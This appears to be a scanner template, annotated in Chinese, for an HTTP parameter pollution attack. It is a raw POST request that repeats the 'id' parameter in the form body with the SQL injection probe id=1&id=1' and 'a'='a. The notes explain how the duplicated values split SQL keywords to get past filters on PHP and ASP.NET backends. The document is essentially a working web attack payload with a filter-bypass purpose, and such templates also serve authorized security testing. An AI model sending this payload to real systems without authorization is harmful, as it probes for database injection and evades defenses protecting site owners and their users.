# @name: HTTP参数污染(HPP-POST Body)
# @tags: post,sqli,hpp,php,aspnet,id,bypass
# @color: cyan
# @validate: baseline_similarity
# @threshold: 0.92
# @intent: hpp_post_body
# @intent.param: id
# @intent.payload: id=1&id=1' and 'a'='a
# @note: 在 POST 表单 Body 中重复提交 id 参数(HTTP 参数污染)，不同后端取首/末/拼接值，分裂关键字使单值看似无害(PHP 拼接、ASP.NET 取末值)。
POST / HTTP/1.1
Host: {{TARGET_HOST_HEADER}}
User-Agent: {{USER_AGENT}}
Content-Type: application/x-www-form-urlencoded

id=1&id=1'+and+'a'='a
